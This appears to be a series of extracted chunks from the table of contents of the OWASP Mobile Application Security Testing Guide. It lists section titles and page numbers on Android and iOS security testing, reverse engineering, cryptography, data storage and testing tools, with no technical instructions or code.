    "text": ". . . . . . . . . . . . 61 InterceptingHTTP(S)Traffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63 InterceptingNon-HTTPTraffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 InterceptingTrafficfromtheAppProcess . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 InterceptingTrafficontheNetworkLayer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 MobileAppCryptography 71 KeyConcepts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 IdentifyingInsecureand/orDeprecatedCryptographicAlgorithms . . . . . . . . . . . . . . . . . . . . 71 CommonConfigurationIssues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72 CryptographicAPIsonAndroidandiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 CryptographicPolicy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 CryptographyRegulations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76 MobileAppCodeQuality 77 InjectionFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77 Cross-SiteScriptingFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80 BinaryProtectionMechanisms . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 4
    }
  },
  {
    "text": ". 79 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80 BinaryProtectionMechanisms . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 MobileAppUserPrivacyProtection 84 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 TestingforPrivacyinMobileApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 86 TestingUserEducationonDataPrivacyontheAppMarketplace . . . . . . . . . . . . . . . . . . . . 87 TestingUserEducationonSecurityBestPractices . . . . . . . . . . . . . . . . . . . . . . . . . . 87 AndroidPlatformOverview 89 AndroidArchitecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89 AndroidSecurity: Defense-in-DepthApproach . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92 AndroidApplicationStructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95 AndroidApplicationPublishing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104 AndroidSecurityTesting 108 AndroidTestingSetup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108 InstallingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 ObtainingandExtractingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 ExploringtheAppPackage . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 5
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . 111 ExploringtheAppPackage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113 SymbolicExecution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115 Patching . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 122 RetrievingStrings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124 AccessingAppDataDirectories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125 DynamicAnalysisonNon-RootedDevices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 StaticAnalysisonAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 BypassingCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127 SettingUpanInterceptionProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129 MethodHooking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135 GettingLoadedClassesandMethodsDynamically . . . . . . . . . . . . . . . . . . . . . . . . . . 140 LibraryInjection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140 Debugging . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 6
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140 Debugging . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 142 JNITracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152 MonitoringSystemLogs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152 RuntimeReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153 Host-DeviceDataTransfer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 155 DecompilingJavaCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156 ProcessExploration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159 Repackaging&Re-Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163 ReviewingDecompiledJavaCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164 5\\nGetOpenConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165 GetLoadedNativeLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166 AccessingtheDeviceShell . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 7
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . 166 AccessingtheDeviceShell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 166 BasicNetworkMonitoring/Sniffing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168 ReviewingDisassembledNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 171 DisassemblingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174 ExecutionTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178 InformationGathering-APIUsage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179 RetrievingCrossReferences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 MethodTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 GetOpenFiles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180 DisassemblingCodetoSmali . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181 NativeCodeTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 181 InformationGathering-NetworkCommunication . . . . . . . . . . . . . . . . . . . . . . . . . . . 183 SandboxInspection . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 8
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . 183 SandboxInspection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 AutomatedStaticAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 ListingInstalledApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184 DynamicAnalysisonAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185 TaintAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185 WaitingfortheDebugger . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186 Emulation-basedAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188 ReverseEngineeringAndroidApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189 RepackagingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189 AndroidDataStorage 190 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190 DeterminingWhetherSensitiveDataIsSharedwithThirdPartiesviaEmbeddedServices . . . . . . . . . . 203 DeterminingWhetherSensitiveDataIsSharedwithThirdPartiesviaNotifications . . . . . . . . . . . . . 203 TestingBackupsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204 TestingLocalStorageforSensitiveData . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 9
    }
  },
  {
    "text": "203 TestingBackupsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204 TestingLocalStorageforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206 TestingMemoryforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208 DeterminingWhethertheKeyboardCacheIsDisabledforTextInputFields . . . . . . . . . . . . . . . . 214 TestingLogsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215 TestingtheDevice-Access-SecurityPolicy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217 AndroidCryptographicAPIs 219 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219 TestingSymmetricCryptography . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 223 TestingtheConfigurationofCryptographicStandardAlgorithms . . . . . . . . . . . . . . . . . . . . 224 TestingRandomNumberGeneration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225 TestingthePurposesofKeys . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226 AndroidLocalAuthentication 227 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227 TestingBiometricAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232 TestingConfirmCredentials . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 233 AndroidNetworkCommunication 234 Overview . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 10
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 233 AndroidNetworkCommunication 234 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234 TestingCustomCertificateStoresandCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . 235 TestingEndpointIdentifyVerification . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 239 TestingtheSecurityProvider . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242 TestingDataEncryptionontheNetwork . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242 TestingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 243 AndroidPlatformAPIs 245 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245 TestingWebViewProtocolHandlers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258 TestingforOverlayAttacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259 TestingWebViewsCleanup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 260 6\\nTestingforAppPermissions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261 CheckingforSensitiveDataDisclosureThroughtheUserInterface . . . . . . . . . . . . . . . . . . . 265 FindingSensitiveInformationinAuto-GeneratedScreenshots . . . . . . . . . . . . . . . . . . . . . . 265 TestingforVulnerableImplementationofPendingIntent . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 11
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . 265 FindingSensitiveInformationinAuto-GeneratedScreenshots . . . . . . . . . . . . . . . . . . . . . . 265 TestingforVulnerableImplementationofPendingIntent . . . . . . . . . . . . . . . . . . . . . . . . 267 TestingJavaScriptExecutioninWebViews . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 268 TestingforSensitiveFunctionalityExposureThroughIPC . . . . . . . . . . . . . . . . . . . . . . . . 269 DeterminingWhetherSensitiveStoredDataHasBeenExposedviaIPCMechanisms . . . . . . . . . . . . 276 TestingDeepLinks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280 TestingforJavaObjectsExposedThroughWebViews . . . . . . . . . . . . . . . . . . . . . . . . . 285 AndroidCodeQualityandBuildSettings 287 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287 MakeSureThatFreeSecurityFeaturesAreActivated . . . . . . . . . . . . . . . . . . . . . . . . . 289 TestingforInjectionFlaws . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290 TestingLocalStorageforInputValidation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 292 TestingObjectPersistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 293 TestingImplicitIntents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 295 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 12
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . 295 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 297 CheckingforWeaknessesinThirdPartyLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . 298 TestingforURLLoadinginWebViews . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 299 AndroidAnti-ReversingDefenses 301 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 301 TestingwhethertheAppisDebuggable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317 TestingReverseEngineeringToolsDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 318 TestingRootDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319 TestingFileIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 320 TestingforDebuggingSymbols . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321 TestingforDebuggingCodeandVerboseErrorLogging . . . . . . . . . . . . . . . . . . . . . . . . 321 TestingAnti-DebuggingDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 322 TestingRuntimeIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 323 TestingObfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324 TestingEmulatorDetection . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 13
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324 TestingEmulatorDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 325 MakingSurethattheAppisProperlySigned . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 325 iOSPlatformOverview 327 iOSSecurityArchitecture . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327 SoftwareDevelopmentoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331 AppsoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331 iOSSecurityTesting 334 iOSTestingSetup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 334 DynamicAnalysisonNon-JailbrokenDevices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 337 MethodHooking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 339 GettingLoadedClassesandMethodsdynamically . . . . . . . . . . . . . . . . . . . . . . . . . . 340 SandboxInspection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 InformationGathering-APIUsage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 Emulation-basedAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 MonitoringSystemLogs . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 14
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341 MonitoringSystemLogs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 345 RepackagingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 346 LibraryInjection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347 ProcessExploration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 347 Waitingforthedebugger . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351 GetLoadedNativeLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351 AutomatedStaticAnalysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352 RepackagingandRe-Signing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352 DecompilingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353 InformationGathering-NetworkCommunication . . . . . . . . . . . . . . . . . . . . . . . . . . . 353 MethodTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354 7\\nRuntimeReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354 BasicNetworkMonitoring/Sniffing . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 15
    }
  },
  {
    "text": ". . . . . . 354 7\\nRuntimeReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354 BasicNetworkMonitoring/Sniffing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356 RetrievingStrings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356 NativeCodeTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357 AccessingAppDataDirectories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357 SymbolicExecution . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 361 ExploringtheAppPackage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362 AccessingtheDeviceShell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366 ExtractingInformationfromtheApplicationBinary . . . . . . . . . . . . . . . . . . . . . . . . . . 368 PatchingReactNativeApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 370 Patching . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 RetrievingCrossReferences . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 InstallingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 16
    }
  },
  {
    "text": ". . . . . . . . . . . . . 371 InstallingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371 GetOpenConnections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373 DumpingKeyChainData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 373 DisassemblingNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 375 ReviewingDecompiledObjective-CandSwiftCode . . . . . . . . . . . . . . . . . . . . . . . . . . 377 ReviewingDisassembledObjective-CandSwiftCode . . . . . . . . . . . . . . . . . . . . . . . . . 377 BypassingCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 382 ListingInstalledApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384 Debugging . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 384 GetOpenFiles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 388 SettingupanInterceptionProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 389 StaticAnalysisoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 389 ReverseEngineeringiOSApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 17
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . 389 ReverseEngineeringiOSApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390 Host-DeviceDataTransfer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 390 DynamicAnalysisoniOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392 ObtainingandExtractingApps . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 392 ExecutionTracing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 394 ReviewingDisassembledNativeCode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 394 iOSDataStorage 398 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 398 CheckingLogsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 406 TestingLocalDataStorage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 407 TestingBackupsforSensitiveData . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 410 FindingSensitiveDataintheKeyboardCache . . . . . . . . . . . . . . . . . . . . . . . . . . . . 414 DeterminingWhetherSensitiveDataIsSharedwithThirdParties . . . . . . . . . . . . . . . . . . . . 415 iOSCryptographicAPIs 416 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 416 VerifyingtheConfigurationofCryptographicStandardAlgorithms",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 18
    }
  },
  {
    "text": ". 415 iOSCryptographicAPIs 416 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 416 VerifyingtheConfigurationofCryptographicStandardAlgorithms . . . . . . . . . . . . . . . . . . . . 419 TestingKeyManagement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 420 TestingRandomNumberGeneration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 421 iOSLocalAuthentication 422 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 422 TestingLocalAuthentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 424 iOSNetworkCommunication 427 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 427 TestingtheTLSSettings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 430 TestingCustomCertificateStoresandCertificatePinning . . . . . . . . . . . . . . . . . . . . . . . 431 TestingEndpointIdentityVerification . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 432 TestingDataEncryptionontheNetwork . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 433 iOSPlatformAPIs 436 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 436 TestingWebViewProtocolHandlers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450 TestingAppExtensions . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 19
    }
  },
  {
    "text": ". . 436 TestingWebViewProtocolHandlers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 450 TestingAppExtensions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 454 8\\nTestingCustomURLSchemes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 455 CheckingforSensitiveDataDisclosedThroughtheUserInterface . . . . . . . . . . . . . . . . . . . . 468 TestingAppPermissions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 469 DeterminingWhetherNativeMethodsAreExposedThroughWebViews . . . . . . . . . . . . . . . . . . 474 DeterminingWhetherSensitiveDataIsExposedviaIPCMechanisms . . . . . . . . . . . . . . . . . . 477 TestingUIPasteboard . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 478 TestingforSensitiveFunctionalityExposureThroughIPC . . . . . . . . . . . . . . . . . . . . . . . . 480 TestingAuto-GeneratedScreenshotsforSensitiveInformation . . . . . . . . . . . . . . . . . . . . . 480 TestingUIActivitySharing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 481 TestingUniversalLinks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 487 TestingObjectPersistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 501 MemoryCorruptionBugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 501 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 502 CheckingforWeaknessesinThirdPartyLibraries",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 20
    }
  },
  {
    "text": ". . . . . . . . . . 501 TestingEnforcedUpdating . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 502 CheckingforWeaknessesinThirdPartyLibraries . . . . . . . . . . . . . . . . . . . . . . . . . . . 503 TestingforDebuggingCodeandVerboseErrorLogging . . . . . . . . . . . . . . . . . . . . . . . . 516 TestingAnti-DebuggingDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 518 TestingJailbreakDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 518 TestingwhethertheAppisDebuggable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 519 TestingObfuscation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingReverseEngineeringToolsDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingforDebuggingSymbols . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 520 TestingEmulatorDetection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 521 TestingFileIntegrityChecks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 521 MakingSurethattheAppIsProperlySigned . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 522 TestingTools 524 gplaycli . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524 Xposed . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 21
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . 524 Xposed . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 524 APKiD . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 525 JustTrustMe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 526 objectionforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 526 Drozer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 527 Scrcpy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 528 AndroidStudio . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 528 FridaforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 529 Apktool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 532 Termux . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 adb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 22
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . 533 adb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 SSLUnpinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 apkx . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 533 RootCloakPlus . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 534 Angr . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 534 Magisk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 534 FlowDroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 jdb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 APKLab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 Busybox . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 Proguard . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 23
    }
  },
  {
